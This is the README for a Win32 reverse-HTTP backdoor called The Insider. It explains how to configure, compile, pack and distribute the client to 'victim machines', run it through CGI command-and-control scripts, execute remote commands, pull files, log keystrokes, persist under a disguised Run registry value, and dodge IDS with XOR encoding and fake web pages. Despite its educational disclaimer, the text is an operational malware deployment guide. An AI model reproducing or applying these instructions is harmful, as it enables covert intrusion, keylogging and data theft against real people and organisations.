

The Insider V2.3.1 -- Win32 reverse backdoor
nick102799@hotmail.com , Sep 20 2003
==========================================


Read this carefully before you start using this software
========================================================

This program is provided for educational purposes only, any misuse of the 
product is at your own risk.

This program is released in hope to increase people's a awareness in 
client-side security issues by showing how easy it is to exploit http channel
in remote command execution.



Introduction
============

This is a reference implementation of win32 reverse backdoor program
called the Insider. Unlike many other backdoor programs, Insider is not
server listening some tcp/udp port, it is a client program that communicates
with the server part through http protocol. This design has some unique
features:

- Pass through almost any corporate firewall (it can automatically
  detect proxy settings if needed)
- No listening services found with "netstat -an"
- Easy to hide from IDS - communication seems like a normal web browsing
- Web interface for client management

Insider network consists of the following parts:

- Client(s) on victim machine(s)
- 2 cgi scripts: a driver script "cc.cgi" that communicates with the clients
  and a script "master.cgi" that gives a user interface to Insider network.

Client is a simple win32 program that is distributed on victim machine in
some way - send some executable to victim, do some ActiveX tricks, whatever.
The client features:

- Automatic http proxy detection
- Automatic proxy authentication
- System command execution
- File download/upload
- Simple keylogger (NT/2000/XP only)
- Uninstallation
- OS shutdown/reboot

The cgi part can be installed on any server that can execute perl cgi scripts - 
anonymous hosting service should be fine.

This program is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the 
Free Software Foundation; either version 2 of the License, or (at your option)
any later version.

This program is distributed in the hope that it will be useful, but WITHOUT 
ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS 
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.



Operation
=========

Clients are identified with a unique 32-character id which is sent to server 
every time the client has something to say. This gives you a quite scalable
network of clients (I guess that the cgis won't scale that good, though..).
Because it may be a bit odd to handle the clients as md5 strings, the cgis
provide an additional mechanism for naming, aliastable. See the format of this
file below in section Installation, section 3.

After the initial execution, client finds out some settings from registry
and sends the following information to server:

User: Login (Real name)
Logon domain: Domainname
Location: Company (Country)
System: Operating system (Service pack)
Connection: Connection type

After that, it waits for a predefined time between MIN and MAX (see
insider.h) and loops forever waiting for new commands and executing them.
Commands are passed directly to the system command interpreter (cmd.exe
or command.com).

In addition to that, following built-in commands are defined in this
version:

cd <dir>		Change current directory. Initial cd is defined in
			insider.h (#define STARTDIR)

download <file>		Download file from client. The file appears in 
			"Downloaded files" section in master.cgi if successful.
			NOTE: the file is read in the memory before sending.
			Several megs should be ok, but that iso image is not..
			Example: dowload c:\files\classified.txt

exit			Shutdown the client (only Insider, not the OS!).

fetch <url>		Fetch file from http server and store it as local file.
			Url is a normal http url, for example http://server/file.zip.
			File is saved in the current directory.
			NOTE: the file is read in the memory before saving.

info			Send initial information again.

logstart <file>		Start built-in keylogger (NT/2000/XP), log to file.
			If the file is empty, log in file defined in insider.h 
			(#define KEYLOG).
			Example: logstart c:\key.dat

logstop			Stop keylogger.

pwd			Show current directory.

reboot			Reboot the operating system.

uninstall		Uninstall the client. This command removes the registry
			value defined in insider.h (#define REGRUN) and places
			"del client.exe" in RunOnce registry key (client.exe is
			the actual client binary name in REGRUN).

shutdown		Shutdown the operating system.

timeout <min-max>	Set the polling time random between min and max seconds.
			Default is 60-300 secs. Use something like 10-20 secs when
			working with the client.
			Example: timeout 20-30

These are the commands you type in "Pending command" input field in
master.cgi. The command results are presented in black window below the command
input field. Only the output is directed, do not use commands that require
interactive input. If your program need input, use piping (| or <).

If defined, the client logs some information in text file. To enable this, you
must edit the file insider.h (see below). This is not normally required (and not
recommended, since it leaves a visible trace on victim machine) but you may want
to try it out in lab when preparing your clients. The server part logs information
in file defined in cc.cgi (see below). This file has the following format:

Sun Aug  3 09:07:06 2003 client=xxxxxx, result=0
Sun Aug  3 09:07:09 2003 client=yyyyyy, result=0
Sun Aug  3 09:07:15 2003 client=zzzzzz, cmd=netstat -rn, result=0
Sun Aug  3 09:07:20 2003 client=zzzzzz, result=1

client is the client in question, cmd is the command sent to client (when there
is one) and result indicates that there was some data in result (1, or 0 if not).
In the example above, client zzzzzz asks for command and is returned "netstat -rn".
Five seconds later it returns something (result=1). Clients xxxxxx and yyyyyy are
just polling.



Installation
============

1. Edit file insider.h (or use precompiled binary in.exe, see section 2.)

- Change HOST, PORT and URL to that of your cgi:

/* Default host and port */
#define HOST    "someserver.com"
#define PORT    80

/* Base URL */
#define URL     "/cgi-bin/cc.cgi";

- Also, it might be a good idea to change the default prefix:

/* Comment prefix */
#define PREFIX  "StartJavaScript="

- If you want to encode commands and results, use

#define ENCODE 1
#define PASSWORD "YourPasswordHere"

This is done by xoring the text with the password. Not enough for secure
communication but enough to make things a bit harder for NIDS, like snort.
Note that this feature is available only in versions 1.1.0+ and 2.1.0+.
If your client is below this version and the server is above, use ENCODE 0
(and vice versa).


- If you want to debug, edit

/* Debug ? */
#define DEBUG		0
#define LOGFILE		"C:\\windows\\wintask.log"

(note the double \\ in pathname).


- If you want to uninstall the client cleanly, define the Run registry key:

/* Uninstallation registry parameters */
#define REGHIVE		HKEY_LOCAL_MACHINE
#define REGKEY		"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REGVAL		"TaskManager"

(of course, your installer must write that registry value..)



2. Run compile.bat (you need MS Visual C to do this).

- You should now have a binary insider.exe, size about 56K. Pack the file
if feel like it (upx can squeeze it in 28K).

NOTE: You can also use the precompiled binary file in.exe and configure
the client using the following registry keys:

HKCU\Software\Microsoft\TaskManager\Host
HKCU\Software\Microsoft\TaskManager\Port
HKCU\Software\Microsoft\TaskManager\URL
HKCU\Software\Microsoft\TaskManager\Prefix
HKCU\Software\Microsoft\TaskManager\Password

In that case, you must write the above registry keys somehow in the
installation process. You can always rename in.exe if you wish.



3. Prepare your cgis

- Edit the variable $prefix in cc.cgi to fit your clients

- Edit the variable $basedir in cc.cgi and master.cgi. Make sure that the web
server can write to that directory. Both cc.cgi and master.cgi try to create the
dir if it doesn't exist.

- Edit $encode and $password in cc.cgi:

# Use content encoding? (0 = no, 1 = yes)
$encode = 1;

# Encoding password (use if $encode = 1)
$password = "YourPasswordHere";


- Edir $logfile in cc.cgi, and make sure that the server can write to that file

- Take some web page and cut that in two parts, called header.txt and
footer.txt. The command is inserted as a base64-encoded message in comment field
between the two parts:

(header.txt)
<!-- (command) -->
(footer.txt)

Of course, it could be as simple as a bare "<!-- (command) -->", but you might
want to make look like someone is browing your web site with a real
content. You define these two files in cc.cgi, for example:

$header = "/var/www/cgi-bin/header.txt";
$footer = "/var/www/cgi-bin/footer.txt";


- Edir $alias variable in both cc.cgi and master.cgi (optional)

The format of this file is as follows:

#
# This is a comment
# Left side of the ":" char is the md5 string, right side is the alias
#

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:Client a
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb:Client b
....
nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn:Client n

Now, both cc.cgi and master.cgi can handle the clients with an alias name
on the right side of the table instead of the 32-char md5 string on left side.
$alias must be readable to web server.


- Copy cc.cgi and master.cgi to web server.

- Make sure that the web server can execute the scripts

Some notes:

- File download feature copies the downloaded files in directory
$basedir/client/files/ - this may not work if $basedir resides under /cgi-bin/
If you don't know what I'm talking about, just use the supplied $basedir, it
should work with apache..



4. Distribute

- example binder/installer is included in directory "binder".


5. Connect your browser to address https://server/dir/master.cgi (try to
use https whenever possible!!!!) and wait for your clients to appear.


6. Use your imagination.........




Still in progress
=================

The Insider is an ongoing project. Following things are considered in future
releases:

- Add command history in master.cgi
- Use builtin keylogger to find proxy user/passwd (instead of dialog)
- Use some sort of stego to hide the commands in web page
- Implement silent mode in command return (write results to file?)
- The cgis are still very stupid, make something more useful


Any help is welcome!!!!



Contact
=========

Email: nick102799@hotmail.com




